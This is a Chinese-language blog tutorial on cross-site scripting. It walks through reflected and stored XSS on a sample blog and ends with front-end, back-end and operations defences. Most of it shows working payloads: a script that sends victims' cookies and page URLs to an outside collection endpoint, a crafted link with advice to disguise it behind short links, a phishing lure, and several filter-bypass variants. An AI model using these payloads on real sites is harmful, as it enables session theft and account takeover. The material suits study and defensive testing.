# [如何实施一次XSS攻击](https://zhuanlan.zhihu.com/p/91437488)

[![isjs](xss-how-imgs/v2-0f3b4a5ced8e959c10018df33034cccb_xs.jpg)](https://www.zhihu.com/people/isjs)

[isjs](https://www.zhihu.com/people/isjs)

公众号：js前端架构

关注他

1 人赞同了该文章

**注意：本文主要目的是使大家了解不同的攻击方式，从而进行网站自查。所以只会展示部分代码。切勿以此方式牟利，合理、合法使用。**

------

**什么是XSS攻击？**

xss攻击，全称跨站脚本攻击*（Cross Site Scripting）*是一种将攻击脚本放置在被攻击页面，实现窃取用户信息，伪造用户行为的攻击方式。XSS攻击方式多变，主要危害如下：

**1.窃取用户 Cookie，Token，登录信息，伪造用户行为。**

**2.动态修改站点页面结构，实现广告挂载。**

**3.对站点访问进行重定向，实现流量劫持。**



XSS 是 web 攻击中最常见的攻击方法之一。根据攻击方式，我们把 XSS 攻击分为两大类：

1.**XSS 反射型攻击**，攻击脚本数据不进行存储。攻击范围小，持续时间短，易于防守，适用于点对点攻击。

2.**XSS 存储型攻击**，攻击脚本存储在数据库中。攻击范围大，持续时间长，不易防守，适用于范围性攻击。

本篇文章将会举例来实现两种攻击，并列举防御方式。



**一.攻击脚本准备**

XSS 攻击也叫跨站脚本攻击，其中的核心是跨站和脚本。首先我们需要有一个攻击脚本，其次我们的脚本要跨站引用到被攻击页面。这样就可以完成一次攻击。攻击成功后，如果需要对用户数据进行保存，我们还需要准备一个数据接收接口。

***1.准备数据接收接口：\***

使用 Node 搭建一个服务，允许跨域请求，并对请求参数进行保存。接口使用这样的方式调用：

```text
https://open.isjs.cn/logStash/push?cookie=123&url=www.***.com 
```

cookie 为被攻击者的 Cookie 信息，url 为攻击发生的页面 url。

***2.准备攻击脚本\***

准备好了数据接收接口后，我们还需要制作一个用于跨站的攻击脚本，代码如下：

```js
(function() {
  var isjs_xss = document.createElement("script");
  isjs_xss.src = "https://open.isjs.cn/logStash/push?cookie="+document.cookie+"&url="+window.location.href;
  var isjs_s = document.getElementsByTagName("script")[0];
   isjs_s.parentNode.insertBefore(isjs_xss, isjs_s);
})();
```

攻击脚本引入到被攻击页面，需要用 script 标签：

```text
<script type="text/javascript" src="https://open.isjs.cn/xss.js?v=110"></script>
```

如上，只要将攻击脚本标签顺利的加载到被攻击者小明的页面中，小明的 cookie 信息就被我们窃取了。



**二.XSS反射型攻击**

XSS 反射型攻击也叫做非存储型攻击，其主要特征是攻击脚本不进行存储。下面我们详细的讲解此类攻击的发起。

***1.攻击前提\***

小明是 [http://www.isjs.cn](https://link.zhihu.com/?target=http%3A//www.isjs.cn) 博客的管理员，拥有删除发言，删除帖子的权限。

小王是一名程序员，他发现最近该论坛上有很多帖子在吐槽他最喜欢的明星。

小王觉得要为自己喜欢的明星做点什么，他准备把这些吐槽的帖子都删除掉。

经过研究，小王发现 [http://www.isjs.cn](https://link.zhihu.com/?target=http%3A//www.isjs.cn) 的登录信息 Token 存储在 Cookie 中。

只要拿到小明的 Token, 就可以拥有小明的登录信息，从而删除帖子。

据此，小王决定对小明发起一次 XSS 的攻击。

***2.攻击入口\***

找到了攻击的方式后，我们需要找一个入口来实施攻击。

也就是找到该网站的一个薄弱点。

通过一段时间的观察，小王发现了一个页面存在漏洞：

![img](xss-how-imgs/v2-b7f0bc08016da8a192c1d6397a777805_720w.jpg)

这个页面的地址栏中包含了页面展示的数据，并且是通过 .html() 的方式渲染页面。

这样的页面就可以作为一个攻击入口。

小王对地址进行改造，利用渲染金额的代码，将攻击脚本引用到页面中：

```text
http://www.isjs.cn/recharge.html?amount=100<script type="text/javascript" src="https://open.isjs.cn/xss.js?v=110"></script>&channel=wx&time=120
//此处可以用短链接转换工具进行加工，使攻击脚本更隐蔽。
```

***3.发起攻击\***

接下来，只需要想办法让小明点击这个链接，就可以攻击成功了。

小王写了一封邮件给小明：

![img](xss-how-imgs/v2-f98e3a493900f5dfe2a91a84879626e4_720w.jpg)

用花言巧语来诱骗被攻击者点击链接，从而完成攻击。

以上，就是一个反射型攻击的例子，通过对域名的恶意修改，实现脚本注入。

此类攻击一般不会造成大规模的攻击，攻击方式比较简单，成本较低。同样也比较容易防范。

***4.如何防御？\***

XSS 反射型攻击比较好防御，要求我们在开发页面时尽量做到少用 .html() 来做页面渲染，尤其是 url 中携带的变量，在渲染时一定要格外小心。

另外也提醒我们，遇到不明身份的链接，不要随便打开。很多攻击者会对植入链接做短链转换，光看地址根本无法分辨是否携带攻击脚本。





**三.XSS存储型攻击**

存储型与非存储型的最大区别，是攻击脚本是否被数据库存储。两者比较，存储型攻击会造成较大的损失，所以我们要重点关注下存储型攻击发起的方式。

***1.攻击前提***

小王攻克了管理员小明的账号后，发现有一部分帖子小明并没有删除的权限。

针对这部分帖子，小王打算攻击发帖的每一个人，并用每一个用户的账号信息修改对应的评论内容。

***2.攻击入口***

经过尝试后，小王发现博客的留言板功能存在攻击漏洞，

![img](xss-how-imgs/v2-bef90f172772fc4fa602332c85f4a994_720w.jpg)

留言时可以插入图片，有可能是未对输入内容做过滤，可以在评论中使用 html 标签。

***3.发起攻击***

于是小王利用此处漏洞发起攻击：

![img](xss-how-imgs/v2-3a2219926dd6c6fed6c8020d241eca11_720w.jpg)

可以看到，攻击脚本被提交到了后台，后台存储后渲染到页面中。
至此，就形成了攻击，只要是查看过这个帖子的用户，Cookie 都会被盗取。

***4.攻击绕过***

上面举例中的攻击方式比较顺利，但是现在很少会有网站会不对参数做校验就进行存储。

每个网站都会存在一些防御策略，比如前端校验，后台校验，渲染前替换等等。

所以说简单的攻击方式很难形成有效的攻击。但是针对不同的防御策略我们可以做攻击绕过。

例如：

***防御方案1：***后台对 <script> 标签做拦截

***绕过方式：***使用 img，Link 标签替代 script 标签，例如：

```text
<img src="#" onerror="javascript:this.src='https://open.isjs.cn/logStash/push?cookie='+document.cookie+'&url='+window.location.href;">
```



***防御方案2：***后台入库前对 <script> 标签做删除

***绕过方式：***使删除后的结果仍是一条正常语句，例如

```text
<scri

<script type="text/javascript" src="https://open.isjs.cn/xss.js?v=110"></script>

pt type="text/javascript" src="https://open.isjs.cn/xss.js?v=110"></script>
```

***绕过方式2：***使用字符填充，或者大小写混合方式绕过，例如

```text
<sc%00ript type="text/javascript" src="https://open.isjs.cn/xss.js?v=110"></sc%00ript>

<sCrIpt type="text/javascript" src="https://open.isjs.cn/xss.js?v=110"></sCrIpt>
```



***防御方案3：***后台拦截一切带 src 属性的标签

***绕过方式：***使用行内样式执行攻击代码，例如下面的流量劫持示例：

```text
//老ie劫持
<p style="color: expression(window.location.href = 'www.isjs.cn')"></p>

//一个撑满屏幕的遮罩，不论点哪里都会被劫持跳转
<div style="width: 100%;position: fixed;top: 0;left: 0;right: 0;bottom: 0;z-index: 9999;" onClick="window.location.href = 'http://www.isjs.cn'"></div>

<a href="javascript:alert('xss')">link</a>
```

拦截绕过的方式特别多，我们这里只简单举例

有需要了解的可百度关键字：**XSS 绕过**



**四.XSS如何防御？**

我们从前往后讲下各个节点对XSS的防护:

***前端：***

1. *对提交参数进行校验，提高攻击难度*

*2. 对接口返回值尽量使用 .text() 方式渲染，避免 .html() 导致攻击脚本的渲染。*

*3. 避免使用 eval，外部链接，外链组件等降低网站安全性的方案。*

*4. 定期对页面请求进行梳理，防止攻击扩散*



***后台：***

1. *对前端提交的参数进行 XSS 过滤*

*2. 对即将入库的参数进行过滤，避免攻击脚本的存储*



***运维：***

1. *选择优秀的 WAF 保护应用程序的安全*

*2. nginx 记录可疑的 url 请求，并排查是否存在反射攻击，尽早发现*



**五.总结**

本文带大家对 XSS 攻击进行了解，作为前端开发工程师，XSS 就是我们需要了解的安全基础。利用 XSS 去检测自己站点的安全性，防患于未然。